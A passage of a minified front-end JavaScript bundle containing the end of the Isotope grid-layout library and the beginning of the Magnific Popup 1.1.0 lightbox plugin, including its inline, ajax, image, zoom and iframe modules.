					i = this.isotope.size.innerWidth + this.gutter;
				0 !== this.x && e + this.x > i && (this.x = 0, this.y = this.maxY);
				var o = {
					x: this.x,
					y: this.y
				};
				return this.maxY = Math.max(this.maxY, this.y + t.size.outerHeight), this.x += e, o
			}, e.prototype._getContainerSize = function() {
				return {
					height: this.maxY
				}
			}, e
		}
		"function" == typeof define && define.amd ? define("isotope/js/layout-modes/fit-rows", ["../layout-mode"], e) : "object" == typeof exports ? module.exports = e(require("../layout-mode")) : e(t.Isotope.LayoutMode)
	}(window),
	function(t) {
		function e(t) {
			var e = t.create("vertical", {
				horizontalAlignment: 0
			});
			return e.prototype._resetLayout = function() {
				this.y = 0
			}, e.prototype._getItemLayoutPosition = function(t) {
				t.getSize();
				var e = (this.isotope.size.innerWidth - t.size.outerWidth) * this.options.horizontalAlignment,
					i = this.y;
				return this.y += t.size.outerHeight, {
					x: e,
					y: i
				}
			}, e.prototype._getContainerSize = function() {
				return {
					height: this.y
				}
			}, e
		}
		"function" == typeof define && define.amd ? define("isotope/js/layout-modes/vertical", ["../layout-mode"], e) : "object" == typeof exports ? module.exports = e(require("../layout-mode")) : e(t.Isotope.LayoutMode)
	}(window),
	function(t) {
		function e(t, e) {
			for (var i in e) t[i] = e[i];
			return t
		}

		function i(t) {
			return "[object Array]" === h.call(t)
		}

		function o(t) {
			var e = [];
			if (i(t)) e = t;
			else if (t && "number" == typeof t.length)
				for (var o = 0, n = t.length; n > o; o++) e.push(t[o]);
			else e.push(t);
			return e
		}

		function n(t, e) {
			var i = f(e, t); - 1 !== i && e.splice(i, 1)
		}

		function r(t, i, r, u, h) {
			function f(t, e) {
				return function(i, o) {
					for (var n = 0, r = t.length; r > n; n++) {
						var s = t[n],
							a = i.sortData[s],
							u = o.sortData[s];
						if (a > u || u > a) {
							var p = void 0 !== e[s] ? e[s] : e,
								h = p ? 1 : -1;
							return (a > u ? 1 : -1) * h
						}
					}
					return 0
				}
			}
			var d = t.create("isotope", {
				layoutMode: "masonry",
				isJQueryFiltering: !0,
				sortAscending: !0
			});
			d.Item = u, d.LayoutMode = h, d.prototype._create = function() {
				this.itemGUID = 0, this._sorters = {}, this._getSorters(), t.prototype._create.call(this), this.modes = {}, this.filteredItems = this.items, this.sortHistory = ["original-order"];
				for (var e in h.modes) this._initLayoutMode(e)
			}, d.prototype.reloadItems = function() {
				this.itemGUID = 0, t.prototype.reloadItems.call(this)
			}, d.prototype._itemize = function() {
				for (var e = t.prototype._itemize.apply(this, arguments), i = 0, o = e.length; o > i; i++) {
					var n = e[i];
					n.id = this.itemGUID++
				}
				return this._updateItemsSortData(e), e
			}, d.prototype._initLayoutMode = function(t) {
				var i = h.modes[t],
					o = this.options[t] || {};
				this.options[t] = i.options ? e(i.options, o) : o, this.modes[t] = new i(this)
			}, d.prototype.layout = function() {
				return !this._isLayoutInited && this.options.isInitLayout ? (this.arrange(), void 0) : (this._layout(), void 0)
			}, d.prototype._layout = function() {
				var t = this._getIsInstant();
				this._resetLayout(), this._manageStamps(), this.layoutItems(this.filteredItems, t), this._isLayoutInited = !0
			}, d.prototype.arrange = function(t) {
				this.option(t), this._getIsInstant(), this.filteredItems = this._filter(this.items), this._sort(), this._layout()
			}, d.prototype._init = d.prototype.arrange, d.prototype._getIsInstant = function() {
				var t = void 0 !== this.options.isLayoutInstant ? this.options.isLayoutInstant : !this._isLayoutInited;
				return this._isInstant = t, t
			}, d.prototype._filter = function(t) {
				function e() {
					f.reveal(n), f.hide(r)
				}
				var i = this.options.filter;
				i = i || "*";
				for (var o = [], n = [], r = [], s = this._getFilterTest(i), a = 0, u = t.length; u > a; a++) {
					var p = t[a];
					if (!p.isIgnored) {
						var h = s(p);
						h && o.push(p), h && p.isHidden ? n.push(p) : h || p.isHidden || r.push(p)
					}
				}
				var f = this;
				return this._isInstant ? this._noTransition(e) : e(), o
			}, d.prototype._getFilterTest = function(t) {
				return s && this.options.isJQueryFiltering ? function(e) {
					return s(e.element).is(t)
				} : "function" == typeof t ? function(e) {
					return t(e.element)
				} : function(e) {
					return r(e.element, t)
				}
			}, d.prototype.updateSortData = function(t) {
				var e;
				t ? (t = o(t), e = this.getItems(t)) : e = this.items, this._getSorters(), this._updateItemsSortData(e)
			}, d.prototype._getSorters = function() {
				var t = this.options.getSortData;
				for (var e in t) {
					var i = t[e];
					this._sorters[e] = l(i)
				}
			}, d.prototype._updateItemsSortData = function(t) {
				for (var e = t && t.length, i = 0; e && e > i; i++) {
					var o = t[i];
					o.updateSortData()
				}
			};
			var l = function() {
				function t(t) {
					if ("string" != typeof t) return t;
					var i = a(t).split(" "),
						o = i[0],
						n = o.match(/^\[(.+)\]$/),
						r = n && n[1],
						s = e(r, o),
						u = d.sortDataParsers[i[1]];
					return t = u ? function(t) {
						return t && u(s(t))
					} : function(t) {
						return t && s(t)
					}
				}

				function e(t, e) {
					var i;
					return i = t ? function(e) {
						return e.getAttribute(t)
					} : function(t) {
						var i = t.querySelector(e);
						return i && p(i)
					}
				}
				return t
			}();
			d.sortDataParsers = {
				parseInt: function(t) {
					return parseInt(t, 10)
				},
				parseFloat: function(t) {
					return parseFloat(t)
				}
			}, d.prototype._sort = function() {
				var t = this.options.sortBy;
				if (t) {
					var e = [].concat.apply(t, this.sortHistory),
						i = f(e, this.options.sortAscending);
					this.filteredItems.sort(i), t !== this.sortHistory[0] && this.sortHistory.unshift(t)
				}
			}, d.prototype._mode = function() {
				var t = this.options.layoutMode,
					e = this.modes[t];
				if (!e) throw Error("No layout mode: " + t);
				return e.options = this.options[t], e
			}, d.prototype._resetLayout = function() {
				t.prototype._resetLayout.call(this), this._mode()._resetLayout()
			}, d.prototype._getItemLayoutPosition = function(t) {
				return this._mode()._getItemLayoutPosition(t)
			}, d.prototype._manageStamp = function(t) {
				this._mode()._manageStamp(t)
			}, d.prototype._getContainerSize = function() {
				return this._mode()._getContainerSize()
			}, d.prototype.needsResizeLayout = function() {
				return this._mode().needsResizeLayout()
			}, d.prototype.appended = function(t) {
				var e = this.addItems(t);
				if (e.length) {
					var i = this._filterRevealAdded(e);
					this.filteredItems = this.filteredItems.concat(i)
				}
			}, d.prototype.prepended = function(t) {
				var e = this._itemize(t);
				if (e.length) {
					var i = this.items.slice(0);
					this.items = e.concat(i), this._resetLayout(), this._manageStamps();
					var o = this._filterRevealAdded(e);
					this.layoutItems(i), this.filteredItems = o.concat(this.filteredItems)
				}
			}, d.prototype._filterRevealAdded = function(t) {
				var e = this._noTransition(function() {
					return this._filter(t)
				});
				return this.layoutItems(e, !0), this.reveal(e), t
			}, d.prototype.insert = function(t) {
				var e = this.addItems(t);
				if (e.length) {
					var i, o, n = e.length;
					for (i = 0; n > i; i++) o = e[i], this.element.appendChild(o.element);
					var r = this._filter(e);
					for (this._noTransition(function() {
							this.hide(r)
						}), i = 0; n > i; i++) e[i].isLayoutInstant = !0;
					for (this.arrange(), i = 0; n > i; i++) delete e[i].isLayoutInstant;
					this.reveal(r)
				}
			};
			var c = d.prototype.remove;
			return d.prototype.remove = function(t) {
				t = o(t);
				var e = this.getItems(t);
				if (c.call(this, t), e && e.length)
					for (var i = 0, r = e.length; r > i; i++) {
						var s = e[i];
						n(s, this.filteredItems)
					}
			}, d.prototype.shuffle = function() {
				for (var t = 0, e = this.items.length; e > t; t++) {
					var i = this.items[t];
					i.sortData.random = Math.random()
				}
				this.options.sortBy = "random", this._sort(), this._layout()
			}, d.prototype._noTransition = function(t) {
				var e = this.options.transitionDuration;
				this.options.transitionDuration = 0;
				var i = t.call(this);
				return this.options.transitionDuration = e, i
			}, d.prototype.getFilteredItemElements = function() {
				for (var t = [], e = 0, i = this.filteredItems.length; i > e; e++) t.push(this.filteredItems[e].element);
				return t
			}, d
		}
		var s = t.jQuery,
			a = String.prototype.trim ? function(t) {
				return t.trim()
			} : function(t) {
				return t.replace(/^\s+|\s+$/g, "")
			},
			u = document.documentElement,
			p = u.textContent ? function(t) {
				return t.textContent
			} : function(t) {
				return t.innerText
			},
			h = Object.prototype.toString,
			f = Array.prototype.indexOf ? function(t, e) {
				return t.indexOf(e)
			} : function(t, e) {
				for (var i = 0, o = t.length; o > i; i++)
					if (t[i] === e) return i;
				return -1
			};
		"function" == typeof define && define.amd ? define(["outlayer/outlayer", "get-size/get-size", "matches-selector/matches-selector", "isotope/js/item", "isotope/js/layout-mode", "isotope/js/layout-modes/masonry", "isotope/js/layout-modes/fit-rows", "isotope/js/layout-modes/vertical"], r) : "object" == typeof exports ? module.exports = r(require("outlayer"), require("get-size"), require("desandro-matches-selector"), require("./item"), require("./layout-mode"), require("./layout-modes/masonry"), require("./layout-modes/fit-rows"), require("./layout-modes/vertical")) : t.Isotope = r(t.Outlayer, t.getSize, t.matchesSelector, t.Isotope.Item, t.Isotope.LayoutMode)
	}(window);


/**
 * Magnific Popup
 * 
 * 1.1.0 | Dmitry Semenov | MIT | http://dimsemenov.com/plugins/magnific-popup/
 */
(function(a) {
	typeof define == "function" && define.amd ? define(["jquery"], a) : typeof exports == "object" ? a(require("jquery")) : a(window.jQuery || window.Zepto)
})(function(a) {
	var b = "Close",
		c = "BeforeClose",
		d = "AfterClose",
		e = "BeforeAppend",
		f = "MarkupParse",
		g = "Open",
		h = "Change",
		i = "mfp",
		j = "." + i,
		k = "mfp-ready",
		l = "mfp-removing",
		m = "mfp-prevent-close",
		n, o = function() {},
		p = !!window.jQuery,
		q, r = a(window),
		s, t, u, v, w = function(a, b) {
			n.ev.on(i + a + j, b)
		},
		x = function(b, c, d, e) {
			var f = document.createElement("div");
			return f.className = "mfp-" + b, d && (f.innerHTML = d), e ? c && c.appendChild(f) : (f = a(f), c && f.appendTo(c)), f
		},
		y = function(b, c) {
			n.ev.triggerHandler(i + b, c), n.st.callbacks && (b = b.charAt(0).toLowerCase() + b.slice(1), n.st.callbacks[b] && n.st.callbacks[b].apply(n, a.isArray(c) ? c : [c]))
		},
		z = function(b) {
			if (b !== v || !n.currTemplate.closeBtn) n.currTemplate.closeBtn = a(n.st.closeMarkup.replace("%title%", n.st.tClose)), v = b;
			return n.currTemplate.closeBtn
		},
		A = function() {
			a.magnificPopup.instance || (n = new o, n.init(), a.magnificPopup.instance = n)
		},
		B = function() {
			var a = document.createElement("p").style,
				b = ["ms", "O", "Moz", "Webkit"];
			if (a.transition !== undefined) return !0;
			while (b.length)
				if (b.pop() + "Transition" in a) return !0;
			return !1
		};
	o.prototype = {
		constructor: o,
		init: function() {
			var b = navigator.appVersion;
			n.isLowIE = n.isIE8 = document.all && !document.addEventListener, n.isAndroid = /android/gi.test(b), n.isIOS = /iphone|ipad|ipod/gi.test(b), n.supportsTransition = B(), n.probablyMobile = n.isAndroid || n.isIOS || /(Opera Mini)|Kindle|webOS|BlackBerry|(Opera Mobi)|(Windows Phone)|IEMobile/i.test(navigator.userAgent), s = a(document), n.popupsCache = {}
		},
		open: function(b) {
			var c;
			if (b.isObj === !1) {
				n.items = b.items.toArray(), n.index = 0;
				var d = b.items,
					e;
				for (c = 0; c < d.length; c++) {
					e = d[c], e.parsed && (e = e.el[0]);
					if (e === b.el[0]) {
						n.index = c;
						break
					}
				}
			} else n.items = a.isArray(b.items) ? b.items : [b.items], n.index = b.index || 0;
			if (n.isOpen) {
				n.updateItemHTML();
				return
			}
			n.types = [], u = "", b.mainEl && b.mainEl.length ? n.ev = b.mainEl.eq(0) : n.ev = s, b.key ? (n.popupsCache[b.key] || (n.popupsCache[b.key] = {}), n.currTemplate = n.popupsCache[b.key]) : n.currTemplate = {}, n.st = a.extend(!0, {}, a.magnificPopup.defaults, b), n.fixedContentPos = n.st.fixedContentPos === "auto" ? !n.probablyMobile : n.st.fixedContentPos, n.st.modal && (n.st.closeOnContentClick = !1, n.st.closeOnBgClick = !1, n.st.showCloseBtn = !1, n.st.enableEscapeKey = !1), n.bgOverlay || (n.bgOverlay = x("bg").on("click" + j, function() {
				n.close()
			}), n.wrap = x("wrap").attr("tabindex", -1).on("click" + j, function(a) {
				n._checkIfClose(a.target) && n.close()
			}), n.container = x("container", n.wrap)), n.contentContainer = x("content"), n.st.preloader && (n.preloader = x("preloader", n.container, n.st.tLoading));
			var h = a.magnificPopup.modules;
			for (c = 0; c < h.length; c++) {
				var i = h[c];
				i = i.charAt(0).toUpperCase() + i.slice(1), n["init" + i].call(n)
			}
			y("BeforeOpen"), n.st.showCloseBtn && (n.st.closeBtnInside ? (w(f, function(a, b, c, d) {
				c.close_replaceWith = z(d.type)
			}), u += " mfp-close-btn-in") : n.wrap.append(z())), n.st.alignTop && (u += " mfp-align-top"), n.fixedContentPos ? n.wrap.css({
				overflow: n.st.overflowY,
				overflowX: "hidden",
				overflowY: n.st.overflowY
			}) : n.wrap.css({
				top: r.scrollTop(),
				position: "absolute"
			}), (n.st.fixedBgPos === !1 || n.st.fixedBgPos === "auto" && !n.fixedContentPos) && n.bgOverlay.css({
				height: s.height(),
				position: "absolute"
			}), n.st.enableEscapeKey && s.on("keyup" + j, function(a) {
				a.keyCode === 27 && n.close()
			}), r.on("resize" + j, function() {
				n.updateSize()
			}), n.st.closeOnContentClick || (u += " mfp-auto-cursor"), u && n.wrap.addClass(u);
			var l = n.wH = r.height(),
				m = {};
			if (n.fixedContentPos && n._hasScrollBar(l)) {
				var o = n._getScrollbarSize();
				o && (m.marginRight = o)
			}
			n.fixedContentPos && (n.isIE7 ? a("body, html").css("overflow", "hidden") : m.overflow = "hidden");
			var p = n.st.mainClass;
			return n.isIE7 && (p += " mfp-ie7"), p && n._addClassToMFP(p), n.updateItemHTML(), y("BuildControls"), a("html").css(m), n.bgOverlay.add(n.wrap).prependTo(n.st.prependTo || a(document.body)), n._lastFocusedEl = document.activeElement, setTimeout(function() {
				n.content ? (n._addClassToMFP(k), n._setFocus()) : n.bgOverlay.addClass(k), s.on("focusin" + j, n._onFocusIn)
			}, 16), n.isOpen = !0, n.updateSize(l), y(g), b
		},
		close: function() {
			if (!n.isOpen) return;
			y(c), n.isOpen = !1, n.st.removalDelay && !n.isLowIE && n.supportsTransition ? (n._addClassToMFP(l), setTimeout(function() {
				n._close()
			}, n.st.removalDelay)) : n._close()
		},
		_close: function() {
			y(b);
			var c = l + " " + k + " ";
			n.bgOverlay.detach(), n.wrap.detach(), n.container.empty(), n.st.mainClass && (c += n.st.mainClass + " "), n._removeClassFromMFP(c);
			if (n.fixedContentPos) {
				var e = {
					marginRight: ""
				};
				n.isIE7 ? a("body, html").css("overflow", "") : e.overflow = "", a("html").css(e)
			}
			s.off("keyup" + j + " focusin" + j), n.ev.off(j), n.wrap.attr("class", "mfp-wrap").removeAttr("style"), n.bgOverlay.attr("class", "mfp-bg"), n.container.attr("class", "mfp-container"), n.st.showCloseBtn && (!n.st.closeBtnInside || n.currTemplate[n.currItem.type] === !0) && n.currTemplate.closeBtn && n.currTemplate.closeBtn.detach(), n.st.autoFocusLast && n._lastFocusedEl && a(n._lastFocusedEl).focus(), n.currItem = null, n.content = null, n.currTemplate = null, n.prevHeight = 0, y(d)
		},
		updateSize: function(a) {
			if (n.isIOS) {
				var b = document.documentElement.clientWidth / window.innerWidth,
					c = window.innerHeight * b;
				n.wrap.css("height", c), n.wH = c
			} else n.wH = a || r.height();
			n.fixedContentPos || n.wrap.css("height", n.wH), y("Resize")
		},
		updateItemHTML: function() {
			var b = n.items[n.index];
			n.contentContainer.detach(), n.content && n.content.detach(), b.parsed || (b = n.parseEl(n.index));
			var c = b.type;
			y("BeforeChange", [n.currItem ? n.currItem.type : "", c]), n.currItem = b;
			if (!n.currTemplate[c]) {
				var d = n.st[c] ? n.st[c].markup : !1;
				y("FirstMarkupParse", d), d ? n.currTemplate[c] = a(d) : n.currTemplate[c] = !0
			}
			t && t !== b.type && n.container.removeClass("mfp-" + t + "-holder");
			var e = n["get" + c.charAt(0).toUpperCase() + c.slice(1)](b, n.currTemplate[c]);
			n.appendContent(e, c), b.preloaded = !0, y(h, b), t = b.type, n.container.prepend(n.contentContainer), y("AfterChange")
		},
		appendContent: function(a, b) {
			n.content = a, a ? n.st.showCloseBtn && n.st.closeBtnInside && n.currTemplate[b] === !0 ? n.content.find(".mfp-close").length || n.content.append(z()) : n.content = a : n.content = "", y(e), n.container.addClass("mfp-" + b + "-holder"), n.contentContainer.append(n.content)
		},
		parseEl: function(b) {
			var c = n.items[b],
				d;
			c.tagName ? c = {
				el: a(c)
			} : (d = c.type, c = {
				data: c,
				src: c.src
			});
			if (c.el) {
				var e = n.types;
				for (var f = 0; f < e.length; f++)
					if (c.el.hasClass("mfp-" + e[f])) {
						d = e[f];
						break
					}
				c.src = c.el.attr("data-mfp-src"), c.src || (c.src = c.el.attr("href"))
			}
			return c.type = d || n.st.type || "inline", c.index = b, c.parsed = !0, n.items[b] = c, y("ElementParse", c), n.items[b]
		},
		addGroup: function(a, b) {
			var c = function(c) {
				c.mfpEl = this, n._openClick(c, a, b)
			};
			b || (b = {});
			var d = "click.magnificPopup";
			b.mainEl = a, b.items ? (b.isObj = !0, a.off(d).on(d, c)) : (b.isObj = !1, b.delegate ? a.off(d).on(d, b.delegate, c) : (b.items = a, a.off(d).on(d, c)))
		},
		_openClick: function(b, c, d) {
			var e = d.midClick !== undefined ? d.midClick : a.magnificPopup.defaults.midClick;
			if (!e && (b.which === 2 || b.ctrlKey || b.metaKey || b.altKey || b.shiftKey)) return;
			var f = d.disableOn !== undefined ? d.disableOn : a.magnificPopup.defaults.disableOn;
			if (f)
				if (a.isFunction(f)) {
					if (!f.call(n)) return !0
				} else if (r.width() < f) return !0;
			b.type && (b.preventDefault(), n.isOpen && b.stopPropagation()), d.el = a(b.mfpEl), d.delegate && (d.items = c.find(d.delegate)), n.open(d)
		},
		updateStatus: function(a, b) {
			if (n.preloader) {
				q !== a && n.container.removeClass("mfp-s-" + q), !b && a === "loading" && (b = n.st.tLoading);
				var c = {
					status: a,
					text: b
				};
				y("UpdateStatus", c), a = c.status, b = c.text, n.preloader.html(b), n.preloader.find("a").on("click", function(a) {
					a.stopImmediatePropagation()
				}), n.container.addClass("mfp-s-" + a), q = a
			}
		},
		_checkIfClose: function(b) {
			if (a(b).hasClass(m)) return;
			var c = n.st.closeOnContentClick,
				d = n.st.closeOnBgClick;
			if (c && d) return !0;
			if (!n.content || a(b).hasClass("mfp-close") || n.preloader && b === n.preloader[0]) return !0;
			if (b !== n.content[0] && !a.contains(n.content[0], b)) {
				if (d && a.contains(document, b)) return !0
			} else if (c) return !0;
			return !1
		},
		_addClassToMFP: function(a) {
			n.bgOverlay.addClass(a), n.wrap.addClass(a)
		},
		_removeClassFromMFP: function(a) {
			this.bgOverlay.removeClass(a), n.wrap.removeClass(a)
		},
		_hasScrollBar: function(a) {
			return (n.isIE7 ? s.height() : document.body.scrollHeight) > (a || r.height())
		},
		_setFocus: function() {
			(n.st.focus ? n.content.find(n.st.focus).eq(0) : n.wrap).focus()
		},
		_onFocusIn: function(b) {
			if (b.target !== n.wrap[0] && !a.contains(n.wrap[0], b.target)) return n._setFocus(), !1
		},
		_parseMarkup: function(b, c, d) {
			var e;
			d.data && (c = a.extend(d.data, c)), y(f, [b, c, d]), a.each(c, function(c, d) {
				if (d === undefined || d === !1) return !0;
				e = c.split("_");
				if (e.length > 1) {
					var f = b.find(j + "-" + e[0]);
					if (f.length > 0) {
						var g = e[1];
						g === "replaceWith" ? f[0] !== d[0] && f.replaceWith(d) : g === "img" ? f.is("img") ? f.attr("src", d) : f.replaceWith(a("<img>").attr("src", d).attr("class", f.attr("class"))) : f.attr(e[1], d)
					}
				} else b.find(j + "-" + c).html(d)
			})
		},
		_getScrollbarSize: function() {
			if (n.scrollbarSize === undefined) {
				var a = document.createElement("div");
				a.style.cssText = "width: 99px; height: 99px; overflow: scroll; position: absolute; top: -9999px;", document.body.appendChild(a), n.scrollbarSize = a.offsetWidth - a.clientWidth, document.body.removeChild(a)
			}
			return n.scrollbarSize
		}
	}, a.magnificPopup = {
		instance: null,
		proto: o.prototype,
		modules: [],
		open: function(b, c) {
			return A(), b ? b = a.extend(!0, {}, b) : b = {}, b.isObj = !0, b.index = c || 0, this.instance.open(b)
		},
		close: function() {
			return a.magnificPopup.instance && a.magnificPopup.instance.close()
		},
		registerModule: function(b, c) {
			c.options && (a.magnificPopup.defaults[b] = c.options), a.extend(this.proto, c.proto), this.modules.push(b)
		},
		defaults: {
			disableOn: 0,
			key: null,
			midClick: !1,
			mainClass: "",
			preloader: !0,
			focus: "",
			closeOnContentClick: !1,
			closeOnBgClick: !0,
			closeBtnInside: !0,
			showCloseBtn: !0,
			enableEscapeKey: !0,
			modal: !1,
			alignTop: !1,
			removalDelay: 0,
			prependTo: null,
			fixedContentPos: "auto",
			fixedBgPos: "auto",
			overflowY: "auto",
			closeMarkup: '<button title="%title%" type="button" class="mfp-close">&#215;</button>',
			tClose: "Close (Esc)",
			tLoading: "Loading...",
			autoFocusLast: !0
		}
	}, a.fn.magnificPopup = function(b) {
		A();
		var c = a(this);
		if (typeof b == "string")
			if (b === "open") {
				var d, e = p ? c.data("magnificPopup") : c[0].magnificPopup,
					f = parseInt(arguments[1], 10) || 0;
				e.items ? d = e.items[f] : (d = c, e.delegate && (d = d.find(e.delegate)), d = d.eq(f)), n._openClick({
					mfpEl: d
				}, c, e)
			} else n.isOpen && n[b].apply(n, Array.prototype.slice.call(arguments, 1));
		else b = a.extend(!0, {}, b), p ? c.data("magnificPopup", b) : c[0].magnificPopup = b, n.addGroup(c, b);
		return c
	};
	var C = "inline",
		D, E, F, G = function() {
			F && (E.after(F.addClass(D)).detach(), F = null)
		};
	a.magnificPopup.registerModule(C, {
		options: {
			hiddenClass: "hide",
			markup: "",
			tNotFound: "Content not found"
		},
		proto: {
			initInline: function() {
				n.types.push(C), w(b + "." + C, function() {
					G()
				})
			},
			getInline: function(b, c) {
				G();
				if (b.src) {
					var d = n.st.inline,
						e = a(b.src);
					if (e.length) {
						var f = e[0].parentNode;
						f && f.tagName && (E || (D = d.hiddenClass, E = x(D), D = "mfp-" + D), F = e.after(E).detach().removeClass(D)), n.updateStatus("ready")
					} else n.updateStatus("error", d.tNotFound), e = a("<div>");
					return b.inlineElement = e, e
				}
				return n.updateStatus("ready"), n._parseMarkup(c, {}, b), c
			}
		}
	});
	var H = "ajax",
		I, J = function() {
			I && a(document.body).removeClass(I)
		},
		K = function() {
			J(), n.req && n.req.abort()
		};
	a.magnificPopup.registerModule(H, {
		options: {
			settings: null,
			cursor: "mfp-ajax-cur",
			tError: '<a href="%url%">The content</a> could not be loaded.'
		},
		proto: {
			initAjax: function() {
				n.types.push(H), I = n.st.ajax.cursor, w(b + "." + H, K), w("BeforeChange." + H, K)
			},
			getAjax: function(b) {
				I && a(document.body).addClass(I), n.updateStatus("loading");
				var c = a.extend({
					url: b.src,
					success: function(c, d, e) {
						var f = {
							data: c,
							xhr: e
						};
						y("ParseAjax", f), n.appendContent(a(f.data), H), b.finished = !0, J(), n._setFocus(), setTimeout(function() {
							n.wrap.addClass(k)
						}, 16), n.updateStatus("ready"), y("AjaxContentAdded")
					},
					error: function() {
						J(), b.finished = b.loadError = !0, n.updateStatus("error", n.st.ajax.tError.replace("%url%", b.src))
					}
				}, n.st.ajax.settings);
				return n.req = a.ajax(c), ""
			}
		}
	});
	var L, M = function(b) {
		if (b.data && b.data.title !== undefined) return b.data.title;
		var c = n.st.image.titleSrc;
		if (c) {
			if (a.isFunction(c)) return c.call(n, b);
			if (b.el) return b.el.attr(c) || ""
		}
		return ""
	};
	a.magnificPopup.registerModule("image", {
		options: {
			markup: '<div class="mfp-figure"><div class="mfp-close"></div><figure><div class="mfp-img"></div><figcaption><div class="mfp-bottom-bar"><div class="mfp-title"></div><div class="mfp-counter"></div></div></figcaption></figure></div>',
			cursor: "mfp-zoom-out-cur",
			titleSrc: "title",
			verticalFit: !0,
			tError: '<a href="%url%">The image</a> could not be loaded.'
		},
		proto: {
			initImage: function() {
				var c = n.st.image,
					d = ".image";
				n.types.push("image"), w(g + d, function() {
					n.currItem.type === "image" && c.cursor && a(document.body).addClass(c.cursor)
				}), w(b + d, function() {
					c.cursor && a(document.body).removeClass(c.cursor), r.off("resize" + j)
				}), w("Resize" + d, n.resizeImage), n.isLowIE && w("AfterChange", n.resizeImage)
			},
			resizeImage: function() {
				var a = n.currItem;
				if (!a || !a.img) return;
				if (n.st.image.verticalFit) {
					var b = 0;
					n.isLowIE && (b = parseInt(a.img.css("padding-top"), 10) + parseInt(a.img.css("padding-bottom"), 10)), a.img.css("max-height", n.wH - b)
				}
			},
			_onImageHasSize: function(a) {
				a.img && (a.hasSize = !0, L && clearInterval(L), a.isCheckingImgSize = !1, y("ImageHasSize", a), a.imgHidden && (n.content && n.content.removeClass("mfp-loading"), a.imgHidden = !1))
			},
			findImageSize: function(a) {
				var b = 0,
					c = a.img[0],
					d = function(e) {
						L && clearInterval(L), L = setInterval(function() {
							if (c.naturalWidth > 0) {
								n._onImageHasSize(a);
								return
							}
							b > 200 && clearInterval(L), b++, b === 3 ? d(10) : b === 40 ? d(50) : b === 100 && d(500)
						}, e)
					};
				d(1)
			},
			getImage: function(b, c) {
				var d = 0,
					e = function() {
						b && (b.img[0].complete ? (b.img.off(".mfploader"), b === n.currItem && (n._onImageHasSize(b), n.updateStatus("ready")), b.hasSize = !0, b.loaded = !0, y("ImageLoadComplete")) : (d++, d < 200 ? setTimeout(e, 100) : f()))
					},
					f = function() {
						b && (b.img.off(".mfploader"), b === n.currItem && (n._onImageHasSize(b), n.updateStatus("error", g.tError.replace("%url%", b.src))), b.hasSize = !0, b.loaded = !0, b.loadError = !0)
					},
					g = n.st.image,
					h = c.find(".mfp-img");
				if (h.length) {
					var i = document.createElement("img");
					i.className = "mfp-img", b.el && b.el.find("img").length && (i.alt = b.el.find("img").attr("alt")), b.img = a(i).on("load.mfploader", e).on("error.mfploader", f), i.src = b.src, h.is("img") && (b.img = b.img.clone()), i = b.img[0], i.naturalWidth > 0 ? b.hasSize = !0 : i.width || (b.hasSize = !1)
				}
				return n._parseMarkup(c, {
					title: M(b),
					img_replaceWith: b.img
				}, b), n.resizeImage(), b.hasSize ? (L && clearInterval(L), b.loadError ? (c.addClass("mfp-loading"), n.updateStatus("error", g.tError.replace("%url%", b.src))) : (c.removeClass("mfp-loading"), n.updateStatus("ready")), c) : (n.updateStatus("loading"), b.loading = !0, b.hasSize || (b.imgHidden = !0, c.addClass("mfp-loading"), n.findImageSize(b)), c)
			}
		}
	});
	var N, O = function() {
		return N === undefined && (N = document.createElement("p").style.MozTransform !== undefined), N
	};
	a.magnificPopup.registerModule("zoom", {
		options: {
			enabled: !1,
			easing: "ease-in-out",
			duration: 300,
			opener: function(a) {
				return a.is("img") ? a : a.find("img")
			}
		},
		proto: {
			initZoom: function() {
				var a = n.st.zoom,
					d = ".zoom",
					e;
				if (!a.enabled || !n.supportsTransition) return;
				var f = a.duration,
					g = function(b) {
						var c = b.clone().removeAttr("style").removeAttr("class").addClass("mfp-animated-image"),
							d = "all " + a.duration / 1e3 + "s " + a.easing,
							e = {
								position: "fixed",
								zIndex: 9999,
								left: 0,
								top: 0,
								"-webkit-backface-visibility": "hidden"
							},
							f = "transition";
						return e["-webkit-" + f] = e["-moz-" + f] = e["-o-" + f] = e[f] = d, c.css(e), c
					},
					h = function() {
						n.content.css("visibility", "visible")
					},
					i, j;
				w("BuildControls" + d, function() {
					if (n._allowZoom()) {
						clearTimeout(i), n.content.css("visibility", "hidden"), e = n._getItemToZoom();
						if (!e) {
							h();
							return
						}
						j = g(e), j.css(n._getOffset()), n.wrap.append(j), i = setTimeout(function() {
							j.css(n._getOffset(!0)), i = setTimeout(function() {
								h(), setTimeout(function() {
									j.remove(), e = j = null, y("ZoomAnimationEnded")
								}, 16)
							}, f)
						}, 16)
					}
				}), w(c + d, function() {
					if (n._allowZoom()) {
						clearTimeout(i), n.st.removalDelay = f;
						if (!e) {
							e = n._getItemToZoom();
							if (!e) return;
							j = g(e)
						}
						j.css(n._getOffset(!0)), n.wrap.append(j), n.content.css("visibility", "hidden"), setTimeout(function() {
							j.css(n._getOffset())
						}, 16)
					}
				}), w(b + d, function() {
					n._allowZoom() && (h(), j && j.remove(), e = null)
				})
			},
			_allowZoom: function() {
				return n.currItem.type === "image"
			},
			_getItemToZoom: function() {
				return n.currItem.hasSize ? n.currItem.img : !1
			},
			_getOffset: function(b) {
				var c;
				b ? c = n.currItem.img : c = n.st.zoom.opener(n.currItem.el || n.currItem);
				var d = c.offset(),
					e = parseInt(c.css("padding-top"), 10),
					f = parseInt(c.css("padding-bottom"), 10);
				d.top -= a(window).scrollTop() - e;
				var g = {
					width: c.width(),
					height: (p ? c.innerHeight() : c[0].offsetHeight) - f - e
				};
				return O() ? g["-moz-transform"] = g.transform = "translate(" + d.left + "px," + d.top + "px)" : (g.left = d.left, g.top = d.top), g
			}
		}
	});
	var P = "iframe",
		Q = "//about:blank",
		R = function(a) {
			if (n.currTemplate[P]) {
				var b = n.currTemplate[P].find("iframe");
				b.length && (a || (b[0].src = Q), n.isIE8 && b.css("display", a ? "block" : "none"))
			}
		};
	a.magnificPopup.registerModule(P, {
		options: {
			markup: '<div class="mfp-iframe-scaler"><div class="mfp-close"></div><iframe class="mfp-iframe" src="//about:blank" frameborder="0" allowfullscreen></iframe></div>',
			srcAction: "iframe_src",
			patterns: {
				youtube: {
					index: "youtube.com",
					id: "v=",
					src: "//www.youtube.com/embed/%id%?autoplay=1"
				},
				vimeo: {
					index: "vimeo.com/",
					id: "/",
					src: "//player.vimeo.com/video/%id%?autoplay=1"
				},
				gmaps: {
					index: "//maps.google.",
					src: "%id%&output=embed"
				}
			}
		},
		proto: {
			initIframe: function() {
				n.types.push(P), w("BeforeChange", function(a, b, c) {
